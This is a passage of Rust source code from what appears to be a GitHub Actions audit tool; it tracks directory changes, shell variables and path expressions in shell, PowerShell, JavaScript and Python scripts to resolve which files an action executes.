            depth: 0,
            composite: false,
        },
        ShellLocationState::starting_in(directory),
        &mut executions,
    );
    executions
}

/// Follows a script command by command so a later reassignment or directory
/// change applies only to what runs after it. Branches, loop bodies,
/// function bodies and the commands after `&&` or `||` may not run. In a
/// composite step, leaving a resolved location is itself unresolved: the
/// workspace or an input can lead back into the action.
pub(crate) fn shell_script_executions(
    content: &str,
    powershell: bool,
    scan: ShellScan,
    mut state: ShellLocationState,
    executions: &mut Vec<LocatedExecution>,
) {
    let content = if powershell {
        content.replace('\\', "/")
    } else {
        content.to_string()
    };
    let mut frames: Vec<ShellFrame> = Vec::new();
    let mut chain: Option<ShellLocationState> = None;
    let mut function_pending = false;
    for (conditional, raw) in shell_command_sequence(&content) {
        match (conditional, chain.take()) {
            (true, entry) => chain = Some(entry.unwrap_or_else(|| state.clone())),
            (false, Some(entry)) => state = entry.merge(&state),
            (false, None) => {}
        }
        let mut text = raw.trim();
        if text.starts_with('#') {
            continue;
        }
        loop {
            if let Some(rest) = text.strip_prefix('(')
                && !rest.starts_with('(')
            {
                frames.push(ShellFrame::Subshell(state.clone()));
                text = rest.trim_start();
                continue;
            }
            let (word, rest) = text
                .split_once(char::is_whitespace)
                .map_or((text, ""), |(word, rest)| (word, rest.trim_start()));
            match word {
                "if" => frames.push(ShellFrame::Conditional(state.clone())),
                "while" | "until" | "select" => {
                    frames.push(ShellFrame::Loop(state.clone(), None));
                }
                "for" => {
                    let variable = rest.split_whitespace().next().map(str::to_string);
                    frames.push(ShellFrame::Loop(state.clone(), variable));
                    break;
                }
                "then" | "do" | "!" => {}
                "elif" | "else" => {
                    if let Some(ShellFrame::Conditional(entry)) = frames.last() {
                        state = entry.merge(&state);
                    }
                }
                "fi" | "done" | "esac" | "}" => match frames.pop() {
                    Some(
                        ShellFrame::Conditional(entry)
                        | ShellFrame::Case(entry)
                        | ShellFrame::Subshell(entry),
                    ) => state = entry.merge(&state),
                    // A body that changes what it runs from applies that
                    // change to its own earlier commands on the next pass.
                    Some(ShellFrame::Loop(entry, variable)) => {
                        let merged = entry.merge(&state);
                        let mut unchanged = merged.clone();
                        if let Some(variable) = variable {
                            match entry.variables.get(&variable) {
                                Some(value) => unchanged.variables.insert(variable, value.clone()),
                                None => unchanged.variables.remove(&variable),
                            };
                        }
                        if unchanged != entry {
                            executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
                        }
                        state = merged;
                    }
                    Some(ShellFrame::Group) | None => {}
                },
                "case" => {
                    frames.push(ShellFrame::Case(state.clone()));
                    text = "";
                    break;
                }
                "{" => frames.push(if std::mem::take(&mut function_pending) {
                    ShellFrame::Conditional(state.clone())
                } else {
                    ShellFrame::Group
                }),
                "function" => {
                    function_pending = true;
                    text = rest
                        .split_once(char::is_whitespace)
                        .map_or("", |(_, rest)| rest.trim_start());
                    continue;
                }
                _ if word.ends_with("()") => function_pending = true,
                _ if word.ends_with(')')
                    && !word.contains('(')
                    && matches!(frames.last(), Some(ShellFrame::Case(_))) =>
                {
                    if let Some(ShellFrame::Case(entry)) = frames.last() {
                        state = entry.merge(&state);
                    }
                }
                _ => break,
            }
            text = rest;
        }
        let mut closes = 0;
        while text.ends_with(')') && text.matches('(').count() < text.matches(')').count() {
            text = text[..text.len() - 1].trim_end();
            closes += 1;
        }
        if !text.is_empty() {
            shell_command_executions(text, powershell, scan, &mut state, executions);
        }
        for _ in 0..closes {
            if let Some(ShellFrame::Subshell(entry)) = frames.pop() {
                state = entry;
            }
        }
    }
    if let Some(entry) = chain {
        state = entry.merge(&state);
    }
    let _ = state;
}

/// Splits a script into commands, each marked when it runs only after
/// `&&` or `||`.
fn shell_command_sequence(script: &str) -> Vec<(bool, &str)> {
    let mut commands = Vec::new();
    let mut start = 0;
    let mut conditional = false;
    let mut quote = None;
    let mut escaped = false;
    let mut characters = script.char_indices().peekable();
    while let Some((index, character)) = characters.next() {
        if escaped {
            escaped = false;
            continue;
        }
        if character == '\\' && quote != Some('\'') {
            escaped = true;
            continue;
        }
        if matches!(character, '\'' | '"') {
            quote = match quote {
                None => Some(character),
                Some(open) if open == character => None,
                other => other,
            };
            continue;
        }
        if quote.is_some() {
            continue;
        }
        let doubled = matches!(character, '&' | '|')
            && characters
                .peek()
                .is_some_and(|(_, next)| *next == character);
        if matches!(character, ';' | '\n') || doubled {
            let command = script[start..index].trim();
            if !command.is_empty() {
                commands.push((conditional, command));
            }
            if doubled {
                characters.next();
            }
            conditional = doubled;
            start = characters
                .peek()
                .map_or(script.len(), |(next_index, _)| *next_index);
        }
    }
    let command = script[start..].trim();
    if !command.is_empty() {
        commands.push((conditional, command));
    }
    commands
}

/// Applies one simple command to the state and records its executions.
fn shell_command_executions(
    raw: &str,
    powershell: bool,
    scan: ShellScan,
    state: &mut ShellLocationState,
    executions: &mut Vec<LocatedExecution>,
) {
    if powershell && let Some(captures) = POWERSHELL_ASSIGNMENT_RE.captures(raw) {
        let value = normalize_shell_locations(&captures["value"], &state.variables, powershell);
        let value = value.trim().trim_matches(['"', '\'']);
        assign_shell_variable(
            &mut state.variables,
            &captures["name"].to_ascii_lowercase(),
            value,
        );
        return;
    }
    let command = normalize_shell_locations(raw, &state.variables, powershell);
    for inner in command_substitutions(&command) {
        if scan.depth < MAX_LOCATION_DEPTH {
            shell_script_executions(
                inner,
                powershell,
                ShellScan {
                    depth: scan.depth + 1,
                    ..scan
                },
                state.clone(),
                executions,
            );
        } else if is_location_derived(inner) {
            executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
        }
    }
    let words = shell_words(&command);
    let Some(first) = words.first() else {
        return;
    };
    let lowercase = first.to_ascii_lowercase();
    // `cd` may follow assignments or `command`/`builtin`.
    let directory_command = crate::audit_shell::wrapped_command_word_index(&words)
        .map(|index| &words[index..])
        .filter(|words| {
            words.first().is_some_and(|word| {
                matches!(
                    word.to_ascii_lowercase().as_str(),
                    "cd" | "pushd"
                        | "popd"
                        | "set-location"
                        | "sl"
                        | "push-location"
                        | "pop-location"
                        | "chdir"
                )
            })
        });
    if let Some(words) = directory_command {
        change_shell_directory(words, scan, state, executions);
        return;
    }
    match lowercase.as_str() {
        "export" | "readonly" | "local" | "declare" | "typeset" => {
            for word in &words[1..] {
                if let Some((name, value)) = word.split_once('=')
                    && shell_assignment(word)
                {
                    assign_shell_variable(&mut state.variables, name, value);
                }
            }
            return;
        }
        "unset" => {
            for name in &words[1..] {
                state.variables.remove(name.as_str());
            }
            return;
        }
        "read" => {
            for name in words[1..].iter().filter(|word| !word.starts_with('-')) {
                if state.variables.contains_key(name.as_str()) {
                    state
                        .variables
                        .insert(name.clone(), UNRESOLVED_LOCATION.to_string());
                }
            }
            return;
        }
        "for" => {
            if let Some(name) = words.get(1) {
                if words[2..].iter().any(|word| is_location_derived(word)) {
                    state
                        .variables
                        .insert(name.clone(), UNRESOLVED_LOCATION.to_string());
                } else {
                    state.variables.remove(name.as_str());
                }
            }
            return;
        }
        _ => {}
    }
    if words.iter().all(|word| shell_assignment(word)) {
        for word in &words {
            if let Some((name, value)) = word.split_once('=') {
                assign_shell_variable(&mut state.variables, name, value);
            }
        }
        return;
    }
    for word in &words {
        // `NAME+=suffix` appends to a tracked value.
        if let Some((name, _)) = word.split_once("+=")
            && shell_assignment(&format!("{name}="))
            && (state.variables.contains_key(name) || is_location_derived(word))
        {
            state
                .variables
                .insert(name.to_string(), UNRESOLVED_LOCATION.to_string());
        }
    }
    command_located_executions(&words, &state.directory, scan, executions);
}

/// Applies `cd`, `pushd` or `popd` and their PowerShell forms. A directory
/// stack rotation (`+1`, or `pushd` alone) is not followed.
fn change_shell_directory(
    words: &[String],
    scan: ShellScan,
    state: &mut ShellLocationState,
    executions: &mut Vec<LocatedExecution>,
) {
    let program = words[0].to_ascii_lowercase();
    let operands: Vec<&str> = words[1..]
        .iter()
        .map(String::as_str)
        .filter(|word| *word != "--")
        .collect();
    let rotation = |word: &&str| {
        word.strip_prefix(['+', '-'])
            .is_some_and(|index| !index.is_empty() && index.chars().all(|c| c.is_ascii_digit()))
    };
    let pushes = matches!(program.as_str(), "pushd" | "push-location");
    if matches!(program.as_str(), "popd" | "pop-location") {
        let popped = if operands.iter().any(rotation) {
            Some(LocatedDirectory::Unresolved)
        } else {
            state.stack.pop()
        };
        if let Some(popped) = popped {
            state.previous = std::mem::replace(&mut state.directory, popped);
        }
    } else {
        let target = operands
            .iter()
            .copied()
            .find(|word| !word.starts_with('-') || *word == "-" || rotation(word));
        let next = match target {
            _ if operands.iter().any(rotation) => LocatedDirectory::Unresolved,
            None if pushes => LocatedDirectory::Unresolved,
            None => LocatedDirectory::Caller,
            Some("-") => state.previous.clone(),
            Some(target) if is_location_derived(target) => LocatedDirectory::from_value(target),
            Some(target) if target.starts_with(['/', '~']) => LocatedDirectory::Caller,
            Some(target) => state.directory.join(target),
        };
        if pushes {
            state.stack.push(state.directory.clone());
        }
        state.previous = std::mem::replace(&mut state.directory, next);
    }
    leave_located_directory(scan, state, executions);
}

/// In a composite step, a directory that is not a resolved location may
/// still be the action directory.
fn leave_located_directory(
    scan: ShellScan,
    state: &ShellLocationState,
    executions: &mut Vec<LocatedExecution>,
) {
    if scan.composite && !matches!(state.directory, LocatedDirectory::Located(_)) {
        executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
    }
}

fn assign_shell_variable(variables: &mut HashMap<String, String>, name: &str, value: &str) {
    if !is_location_derived(value) {
        variables.remove(name);
    } else if bound_location(value).is_some() {
        variables.insert(name.to_string(), value.to_string());
    } else {
        variables.insert(name.to_string(), UNRESOLVED_LOCATION.to_string());
    }
}

/// Rewrites a command's script-directory, action-path and tracked-variable
/// references into location markers.
fn normalize_shell_locations(
    command: &str,
    variables: &HashMap<String, String>,
    powershell: bool,
) -> String {
    let mut normalized = SHELL_SELF_DIRECTORY_EXPANSION_RE
        .replace_all(command, regex::NoExpand(SELF_LOCATION))
        .into_owned();
    let self_file = format!("{SELF_LOCATION}/{SELF_FILE}");
    normalized = SHELL_SELF_FILE_RE
        .replace_all(&normalized, regex::NoExpand(&self_file))
        .into_owned();
    normalized = POWERSHELL_ACTION_PATH_RE
        .replace_all(&normalized, regex::NoExpand(ACTION_LOCATION))
        .into_owned();
    normalized = SHELL_ACTION_PATH_RE
        .replace_all(&normalized, regex::NoExpand(ACTION_LOCATION))
        .into_owned();
    if powershell {
        normalized = POWERSHELL_SCRIPT_ROOT_RE
            .replace_all(&normalized, regex::NoExpand(SELF_LOCATION))
            .into_owned();
    }
    normalized = SHELL_VARIABLE_RE
        .replace_all(&normalized, |captures: &regex::Captures<'_>| {
            let (name, modified) = match captures.name("braced") {
                Some(name) => (name.as_str(), !captures["modifier"].is_empty()),
                None => (&captures["plain"], false),
            };
            let key = if powershell {
                name.to_ascii_lowercase()
            } else {
                name.to_string()
            };
            match variables.get(&key) {
                Some(_) if modified => UNRESOLVED_LOCATION.to_string(),
                Some(value) => value.clone(),
                None => captures[0].to_string(),
            }
        })
        .into_owned();
    for _ in 0..MAX_LOCATION_DEPTH {
        let rewritten = SHELL_PATH_SUBSTITUTION_RE.replace_all(
            &normalized,
            |captures: &regex::Captures<'_>| {
                if let Some(directory) = captures.name("directory") {
                    directory.as_str().to_string()
                } else if captures.name("dirname").is_some() {
                    dirname_location(&captures["path"])
                } else {
                    captures["path"].to_string()
                }
            },
        );
        if rewritten == normalized {
            break;
        }
        normalized = rewritten.into_owned();
    }
    if powershell {
        normalized = POWERSHELL_JOIN_PATH_RE
            .replace_all(&normalized, "${root}/${child}")
            .into_owned();
    }
    normalized
}

/// The bodies of top-level `$(...)` and backtick substitutions.
fn command_substitutions(command: &str) -> Vec<&str> {
    let mut bodies = Vec::new();
    let bytes = command.as_bytes();
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'(') {
            let start = index + 2;
            let mut depth = 1usize;
            let mut end = start;
            while end < bytes.len() && depth > 0 {
                match bytes[end] {
                    b'(' => depth += 1,
                    b')' => depth -= 1,
                    _ => {}
                }
                end += 1;
            }
            if depth == 0 {
                bodies.push(&command[start..end - 1]);
            }
            index = end;
        } else if bytes[index] == b'`' {
            let start = index + 1;
            match command[start..].find('`') {
                Some(length) => {
                    bodies.push(&command[start..start + length]);
                    index = start + length + 1;
                }
                None => break,
            }
        } else {
            index += 1;
        }
    }
    bodies
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum ScriptLanguage {
    JavaScript,
    Python,
}

const JAVASCRIPT_LOCATION_TOKENS: [&str; 6] = [
    "__dirname",
    "__filename",
    "import.meta.url",
    "import.meta.dirname",
    "import.meta.filename",
    "GITHUB_ACTION_PATH",
];
const PYTHON_LOCATION_TOKENS: [&str; 3] = ["__file__", "sys.argv[0]", "GITHUB_ACTION_PATH"];

/// A value a name receives: a plain assignment, or a loop, unpacking,
/// destructuring or augmented binding.
struct Binding<'a> {
    value: &'a str,
    plain: bool,
}

/// Every binding in one JavaScript or Python source. Bindings are not scoped.
/// A name is tainted when any binding draws on a location, directly or
/// through another tainted name, in any expression form. Only a name with a
/// single plain assignment is evaluated to a path; a tainted name that does
/// not evaluate to one is unresolved.
struct LocationBindings<'a> {
    language: ScriptLanguage,
    source: &'a str,
    delimiters: Option<&'a crate::audit::JavaScriptDelimiterIndex<'a>>,
    /// Environment variables holding action locations.
    environment: &'a [(String, String)],
    bindings: HashMap<&'a str, Vec<Binding<'a>>>,
    tainted: HashSet<&'a str>,
    values: std::cell::RefCell<HashMap<String, Option<String>>>,
    word_values: std::cell::RefCell<HashMap<String, Vec<String>>>,
}

impl<'a> LocationBindings<'a> {
    fn new(
        language: ScriptLanguage,
        source: &'a str,
        delimiters: Option<&'a crate::audit::JavaScriptDelimiterIndex<'a>>,
        environment: &'a [(String, String)],
    ) -> Self {
        Self {
            language,
            source,
            delimiters,
            environment,
            bindings: HashMap::new(),
            tainted: HashSet::new(),
            values: std::cell::RefCell::default(),
            word_values: std::cell::RefCell::default(),
        }
    }

    fn python(source: &'a str, environment: &'a [(String, String)]) -> Self {
        let mut bindings = Self::new(ScriptLanguage::Python, source, None, environment);
        for captures in PY_ASSIGNMENT_RE.captures_iter(source) {
            let (Some(name), Some(operator)) = (captures.name("name"), captures.name("operator"))
            else {
                continue;
            };
            if !python_in_code(source, name.start()) {
                continue;
            }
            let value = bindings.extent(operator.end());
            bindings.bind(name.as_str(), value, operator.as_str() == "=");
        }
        for captures in PY_REBINDING_RE.captures_iter(source) {
            let (Some(matched), Some((group, targets))) = (
                captures.get(0),
                ["loop", "unpack", "alias", "walrus"]
                    .iter()
                    .find_map(|group| captures.name(group).map(|targets| (*group, targets))),
            ) else {
                continue;
            };
            if !python_in_code(source, targets.start()) {
                continue;
            }
            let line_start = source[..targets.start()]
                .rfind('\n')
                .map_or(0, |index| index + 1);
            let value = match group {
                "loop" => bindings.extent(matched.end()).trim_end_matches(':'),
                "unpack" => bindings.extent(matched.end() - 1),
                "walrus" => bindings.extent(matched.end()),
                // `with EXPRESSION as NAME`
                _ => source[line_start..matched.start()]
                    .trim()
                    .trim_start_matches("async ")
                    .trim_start_matches("with ")
                    .trim_start_matches("except "),
            };
            for name in IDENTIFIER_RE.find_iter(targets.as_str()) {
                bindings.bind(name.as_str(), value, false);
            }
        }
        bindings.trace_taint();
        bindings
    }

    fn bind(&mut self, name: &'a str, value: &'a str, plain: bool) {
        self.bindings
            .entry(name)
            .or_default()
            .push(Binding { value, plain });
    }

    /// Propagates location taint from each binding to the names that read
    /// it, until nothing changes.
    fn trace_taint(&mut self) {
        let mut budget = self.source.len().saturating_mul(32).max(1 << 20);
        let mut readers: HashMap<&'a str, Vec<&'a str>> = HashMap::new();
        let mut pending = Vec::new();
        let mut exhausted = false;
        'names: for (&name, bindings) in &self.bindings {
            for binding in bindings {
                let Some(remaining) = budget.checked_sub(binding.value.len()) else {
                    exhausted = true;
                    break 'names;
                };
                budget = remaining;
                if self.mentions_token(binding.value) {
                    pending.push(name);
                }
                for identifier in code_identifiers(binding.value, self.language) {
                    if identifier != name {
                        readers.entry(identifier).or_default().push(name);
                    }
                }
            }
        }
        if exhausted {
            // Too much to trace: any bound name may carry a location.
            self.tainted = self.bindings.keys().copied().collect();
            return;
        }
        while let Some(name) = pending.pop() {
            if self.tainted.insert(name) {
                pending.extend(readers.get(name).into_iter().flatten().copied());
            }
        }
    }

    fn tokens(&self) -> &'static [&'static str] {
        match self.language {
            ScriptLanguage::JavaScript => &JAVASCRIPT_LOCATION_TOKENS,
            ScriptLanguage::Python => &PYTHON_LOCATION_TOKENS,
        }
    }

    fn mentions_token(&self, text: &str) -> bool {
        self.tokens().iter().any(|token| text.contains(token))
            || self
                .environment
                .iter()
                .any(|(name, _)| text.contains(name.as_str()))
    }

    /// The location an environment variable holds, if any.
    fn environment_value(&self, name: &str) -> Option<String> {
        if name == "GITHUB_ACTION_PATH" {
            return Some(ACTION_LOCATION.to_string());
        }
        self.environment
            .iter()
            .find(|(variable, _)| variable == name)
            .map(|(_, value)| value.clone())
    }

    /// The right-hand side that starts at `start`.
    fn extent(&self, start: usize) -> &'a str {
        let rest = &self.source[start..];
        match self.delimiters {
            Some(delimiters) => delimiters.leading_expression(rest),
            None => python_leading_expression(rest),
        }
    }

    /// Whether `text` draws on a location, directly or through a tainted name.
    fn is_tainted(&self, text: &str) -> bool {
        self.mentions_token(text)
            || code_identifiers(text, self.language)
                .into_iter()
                .any(|name| self.tainted.contains(name))
    }

    /// An expression outside the evaluated forms keeps only its provenance.
    fn opaque(&self, expression: &str) -> String {
        if self.is_tainted(expression) {
            UNRESOLVED_LOCATION.to_string()
        } else {
            DYNAMIC_VALUE.to_string()
        }
    }

    fn value_of(&self, name: &str, depth: usize) -> String {
        // A binding that refers to itself adds no location of its own.
        if let Some(cached) = self.values.borrow().get(name) {
            return cached.clone().unwrap_or_else(|| DYNAMIC_VALUE.to_string());
        }
        let Some(bindings) = self.bindings.get(name) else {
            return DYNAMIC_VALUE.to_string();
        };
        self.values.borrow_mut().insert(name.to_string(), None);
        let value = match bindings.as_slice() {
            [binding] if binding.plain => self.evaluate(binding.value, depth + 1),
            _ => DYNAMIC_VALUE.to_string(),
        };
        let value = if !is_location_derived(&value) && self.tainted.contains(name) {
            UNRESOLVED_LOCATION.to_string()
        } else {
            value
        };
        self.values
            .borrow_mut()
            .insert(name.to_string(), Some(value.clone()));
        value
    }

    fn evaluate(&self, expression: &str, depth: usize) -> String {
        let value =
            if depth > MAX_LOCATION_DEPTH || expression.len() > MAX_LOCATION_EXPRESSION_BYTES {
                self.opaque(expression)
            } else {
                self.evaluate_forms(expression, depth)
            };
        let too_long = value.len() > MAX_LOCATION_VALUE_BYTES;
        if !too_long && is_location_derived(&value) {
            value
        } else if is_location_derived(&value) || self.is_tainted(expression) {
            // Whatever the form, an expression that draws on a location
            // keeps that provenance.
            UNRESOLVED_LOCATION.to_string()
        } else if too_long {
            DYNAMIC_VALUE.to_string()
        } else {
            value
        }
    }

    fn evaluate_forms(&self, expression: &str, depth: usize) -> String {
        let expression = expression.trim();
        if expression.is_empty() {
            return DYNAMIC_VALUE.to_string();
        }
        if let Some(inner) = enclosed(expression, '(', self.language)
            && (self.language == ScriptLanguage::JavaScript
                || split_top_level(inner, ',', self.language).len() < 2)
        {
            return self.evaluate(inner, depth + 1);
        }
        if let Some(branches) = alternative_values(expression, self.language) {
            return merge_location_values(
                branches
                    .into_iter()
                    .map(|branch| self.evaluate(branch, depth + 1)),
            );
        }
        let parts = split_top_level(expression, '+', self.language);
        if parts.len() > 1 {
            let mut joined = String::new();
            for part in &parts {
                joined.push_str(&self.evaluate(part, depth + 1));
                if joined.len() > MAX_LOCATION_VALUE_BYTES {
                    break;
                }
            }
            return joined;
        }
        if self.language == ScriptLanguage::Python {
            let parts = split_top_level(expression, '/', self.language);
            if parts.len() > 1 {
                return join_location(
                    parts.iter().map(|part| self.evaluate(part, depth + 1)),
                    true,
                );
            }
        }
        if let Some(value) = self.literal(expression, depth) {
            return value;
        }
        if let Some(value) = self.chain(expression, depth) {
            return value;
        }
        self.opaque(expression)
    }

    /// The words of an argument vector: a list literal's elements, a split
    /// command string, or one value.
    /// The words of an argument vector, collapsed to one word that keeps
    /// their provenance when there are too many to follow.
    fn evaluate_words(&self, expression: &str, depth: usize) -> Vec<String> {
        let words = self.evaluate_word_forms(expression, depth);
        if words.len() <= MAX_LOCATION_WORDS {
            return words;
        }
        if words.iter().any(|word| is_location_derived(word)) || self.is_tainted(expression) {
            vec![UNRESOLVED_LOCATION.to_string()]
        } else {
            vec![DYNAMIC_VALUE.to_string()]
        }
    }

    fn evaluate_word_forms(&self, expression: &str, depth: usize) -> Vec<String> {
        let expression = expression.trim();
        if depth > MAX_LOCATION_DEPTH {
            return vec![self.opaque(expression)];
        }
        if is_identifier(expression)
            && let Some([binding]) = self.bindings.get(expression).map(Vec::as_slice)
            && binding.plain
        {
            if let Some(words) = self.word_values.borrow().get(expression) {
                return words.clone();
            }
            let words = self.evaluate_words(binding.value, depth + 1);
            // A tainted list that evaluates without a location lost it
            // somewhere this analysis does not follow.
            let words = if self.tainted.contains(expression)
                && !words.iter().any(|word| is_location_derived(word))
            {
                vec![UNRESOLVED_LOCATION.to_string()]
            } else {
                words
            };
            self.word_values
                .borrow_mut()
                .insert(expression.to_string(), words.clone());
            return words;
        }
        let parts = split_top_level(expression, '+', self.language);
        if parts.len() > 1 {
            let mut words = Vec::new();
            for part in &parts {
                words.extend(self.evaluate_words(part, depth + 1));
                if words.len() > MAX_LOCATION_WORDS {
                    break;
                }
            }
            return words;
        }
        let list = enclosed(expression, '[', self.language).or_else(|| {
            (self.language == ScriptLanguage::Python)
                .then(|| enclosed(expression, '(', self.language))
                .flatten()
                .filter(|inner| inner.contains(','))
        });
        if let Some(inner) = list {
            return split_top_level(inner, ',', self.language)
                .into_iter()
                .filter(|element| !element.is_empty())
                .map(|element| {
                    if element.starts_with("...") || element.starts_with('*') {
                        self.opaque(element)
                    } else {
                        self.evaluate(element, depth + 1)
                    }
                })
                .collect();
        }
        if self.language == ScriptLanguage::Python
            && let Some(argument) = expression
                .strip_prefix("shlex.split(")
                .and_then(|rest| rest.strip_suffix(')'))
        {
            return shell_words(&self.evaluate(argument, depth + 1));
        }
        vec![self.evaluate(expression, depth + 1)]
    }

    fn literal(&self, expression: &str, depth: usize) -> Option<String> {
        let quote_at = expression.find(['\'', '"', '`'])?;
        let prefix = &expression[..quote_at];
        let quote = expression[quote_at..].chars().next()?;
        let formatted = match self.language {
            ScriptLanguage::JavaScript if prefix.is_empty() => quote == '`',
            ScriptLanguage::Python
                if quote != '`'
                    && prefix.len() <= 2
                    && prefix
                        .chars()
                        .all(|character| "rRuUfFbB".contains(character)) =>
            {
                if prefix.contains(['b', 'B']) {
                    return (literal_end(&expression[quote_at..], self.language)?
                        == expression.len() - quote_at)
                        .then(|| DYNAMIC_VALUE.to_string());
                }
                prefix.contains(['f', 'F'])
            }
            _ => return None,
        };
        let raw = prefix.contains(['r', 'R']);
        let literal = &expression[quote_at..];
        if literal_end(literal, self.language)? != literal.len() {
            return None;
        }
        let delimiter_length = if self.language == ScriptLanguage::Python
            && literal.len() >= 6
            && literal[1..].starts_with(quote)
            && literal[2..].starts_with(quote)
        {
            3
        } else {
            1
        };
        let body = &literal[delimiter_length..literal.len() - delimiter_length];
        let mut value = String::new();
        let mut characters = body.char_indices().peekable();
        while let Some((index, character)) = characters.next() {
            if character == '\\' && !raw {
                if let Some((_, escaped)) = characters.next() {
                    value.push(escaped);
                }
                continue;
            }
            let interpolation = match (self.language, formatted, character) {
                (ScriptLanguage::JavaScript, true, '$')
                    if characters.peek().is_some_and(|(_, next)| *next == '{') =>
                {
                    characters.next();
                    Some(index + 2)
                }
                (ScriptLanguage::Python, true, '{') => {
                    if characters.peek().is_some_and(|(_, next)| *next == '{') {
                        characters.next();
                        value.push('{');
                        continue;
                    }
                    Some(index + 1)
                }
                (ScriptLanguage::Python, true, '}')
                    if characters.peek().is_some_and(|(_, next)| *next == '}') =>
                {
                    characters.next();
                    value.push('}');
                    continue;
                }
                _ => None,
            };
            let Some(start) = interpolation else {
                value.push(character);
                continue;
            };
            let Some(length) = matching_brace(&body[start..]) else {
                value.push_str(UNRESOLVED_LOCATION);
                break;
            };
            let mut inner = &body[start..start + length];
            if self.language == ScriptLanguage::Python {
                // Conversions and format specs follow the expression.
                let mut end = inner.len();
                scan_code(inner, self.language, |index, character, depth| {
                    let stop = depth == 0
                        && (character == ':'
                            || character == '!' && !inner[index + 1..].starts_with('='));
                    if stop {
                        end = index;
                    }
                    !stop
                });
                inner = &inner[..end];
            }
            value.push_str(&self.evaluate(inner, depth + 1));
            if value.len() > MAX_LOCATION_VALUE_BYTES {
                break;
            }
            while characters
                .peek()
                .is_some_and(|(next, _)| *next < start + length + 1)
            {
                characters.next();
            }
        }
        Some(value)
    }

    fn chain(&self, expression: &str, depth: usize) -> Option<String> {
        let (head, links) = parse_chain(expression, self.language)?;
        let (mut value, mut name) = match head {
            ChainHead::Name(name) => (None, name.to_string()),
            ChainHead::Value(text) => (Some(self.evaluate(text, depth + 1)), String::new()),
        };
        for link in links {
            match link {
                ChainLink::Member(member) => {
                    if !name.is_empty() {
                        name.push('.');
                    }
                    name.push_str(member);
                }
                ChainLink::Call(arguments) => {
                    value = Some(self.call(value.take(), &name, arguments, depth));
                    name.clear();
                }
                ChainLink::Index(key) => {
                    let key = key.trim();
                    let key = self
                        .literal(key, depth + 1)
                        .unwrap_or_else(|| key.to_string());
                    let environment =
                        matches!(name.as_str(), "process.env" | "os.environ" | "environ")
                            && value.is_none();
                    value = Some(
                        if let Some(location) =
                            environment.then(|| self.environment_value(&key)).flatten()
                        {
                            location
                        } else if value.is_none() && name == "sys.argv" && key == "0" {
                            format!("{SELF_LOCATION}/{SELF_FILE}")
                        } else {
                            DYNAMIC_VALUE.to_string()
                        },
                    );
                    name.clear();
                }
            }
        }
        Some(self.settle(value, &name, depth))
    }

    fn settle(&self, value: Option<String>, name: &str, depth: usize) -> String {
        match (value, name.is_empty()) {
            (Some(value), true) => value,
            (Some(value), false) => self.property(&value, name),
            (None, true) => DYNAMIC_VALUE.to_string(),
            (None, false) => self.name(name, depth),
        }
    }

    fn name(&self, dotted: &str, depth: usize) -> String {
        match (self.language, dotted) {
            (ScriptLanguage::JavaScript, "__dirname" | "import.meta.dirname") => {
                return SELF_LOCATION.to_string();
            }
            (
                ScriptLanguage::JavaScript,
                "__filename" | "import.meta.filename" | "import.meta.url",
            )
            | (ScriptLanguage::Python, "__file__") => {
                return format!("{SELF_LOCATION}/{SELF_FILE}");
            }
            (ScriptLanguage::JavaScript, _)
                if let Some(location) = dotted
                    .strip_prefix("process.env.")
                    .and_then(|name| self.environment_value(name)) =>
            {
                return location;
            }
            (_, "os.sep" | "path.sep" | "os.path.sep") => return "/".to_string(),
            _ => {}
        }
        match dotted.split_once('.') {
            None => self.value_of(dotted, depth + 1),
            Some((first, rest)) => self.property(&self.value_of(first, depth + 1), rest),
        }
    }

    fn property(&self, value: &str, dotted: &str) -> String {
        let mut value = value.to_string();
        for member in dotted.split('.') {
            value = match (self.language, member) {
                (ScriptLanguage::Python, "parent") => dirname_location(&value),
                (ScriptLanguage::JavaScript, "href" | "pathname") => value,
                _ if is_location_derived(&value) => UNRESOLVED_LOCATION.to_string(),
                _ => DYNAMIC_VALUE.to_string(),
            };
        }
        value
    }

    fn call(
        &self,
        receiver: Option<String>,
        name: &str,
        argument_text: &str,
        depth: usize,
    ) -> String {
        let (object, function) = match name.rsplit_once('.') {
            Some((object, function)) => (Some(object), function),
            None => (None, name),
        };
        let (receiver, named) = match (receiver, object) {
            (Some(receiver), None) => (Some(receiver), false),
            (Some(receiver), Some(object)) => (Some(self.property(&receiver, object)), false),
            (None, Some(object)) => (Some(self.name(object, depth)), true),
            (None, None) => (None, false),
        };
        let located_receiver = receiver
            .as_deref()
            .filter(|value| is_location_derived(value));
        // `os.path.join` and `require('path').join` join paths; Python's
        // `' '.join` joins strings.
        let path_function = located_receiver.is_none()
            && (receiver.is_none() || named || self.language == ScriptLanguage::JavaScript);
        let arguments: Vec<&str> = split_top_level(argument_text, ',', self.language)
            .into_iter()
            .filter(|argument| {
                !argument.is_empty()
                    && !(self.language == ScriptLanguage::Python
                        && PY_KEYWORD_ARGUMENT_RE.is_match(argument))
            })
            .collect();
        let evaluated = || -> Vec<String> {
            arguments
                .iter()
                .map(|argument| self.evaluate(argument, depth + 1))
                .collect()
        };
        let python = self.language == ScriptLanguage::Python;
        match function {
            // Node's `path.join` appends an absolute-looking part; `resolve`
            // and Python's joins restart at one.
            "join" if path_function => join_location(evaluated(), python),
            "resolve" if path_function => join_location(evaluated(), true),
            "joinpath" => join_location(receiver.into_iter().chain(evaluated()), true),
            "dirname" => dirname_location(
                &located_receiver
                    .map(str::to_string)
                    .or_else(|| evaluated().into_iter().next())
                    .unwrap_or_else(|| DYNAMIC_VALUE.to_string()),
            ),
            "abspath" | "realpath" | "normpath" | "expanduser" | "fspath" | "str" | "String"
            | "fileURLToPath" | "realpathSync" | "normalize" | "resolve" | "absolute"
            | "as_posix" | "toString" | "Path" | "PurePath" | "PosixPath" | "PurePosixPath" => {
                match located_receiver {
                    Some(receiver) => receiver.to_string(),
                    None => join_location(evaluated(), true),
                }
            }
            "with_name" => {
                let directory = dirname_location(receiver.as_deref().unwrap_or(DYNAMIC_VALUE));
                join_location([directory].into_iter().chain(evaluated()), true)
            }
            "URL" => {
                let values = evaluated();
                let relative = values.first().cloned().unwrap_or_default();
                match values.get(1) {
                    Some(base) if !relative.starts_with('/') && !is_location_derived(&relative) => {
                        let directory = if base.ends_with(SELF_FILE) {
                            dirname_location(base)
